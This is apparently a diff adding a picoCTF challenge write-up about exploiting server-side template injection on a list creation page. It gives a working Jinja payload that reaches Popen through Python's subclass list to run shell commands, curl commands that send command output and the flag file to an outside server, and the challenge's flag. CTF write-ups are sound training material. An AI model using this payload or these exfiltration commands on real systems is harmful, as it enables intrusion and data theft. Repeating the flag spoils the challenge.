@@ -1,0 +1,20 @@
+Once again, the list creation page is vulnerable to template injections. Given the hint of
+remote code execution, we probably want to leverage python's builtins to call some function
+that will let us execute code.
+
+We can start by inputting the classic [].__class__.__base__.__subclasses__(), which will
+give us a list of functions that we could call.
+
+Looking down the list, we can find Popen at offset 258, which meets our needs exactly.
+
+We can turn this into an RCE by calling Popen with our own inputs in the form of query strings
+{{ [].__class__.__base__.__subclasses__()[258](request.args.payload, shell=True) }}
+
+Once we do that, we can keep refreshing the page with a "payload" query string containing the command we want to run
+The commands I ran were the following:
+
+curl <ip> --data "test=$(ls)"
+curl <ip> --data "test=$(cat flag)"
+
+Looking through my server logs, we can find the flag:
+picoCTF{R_C_E_wont_let_me_be_85e92c3a}
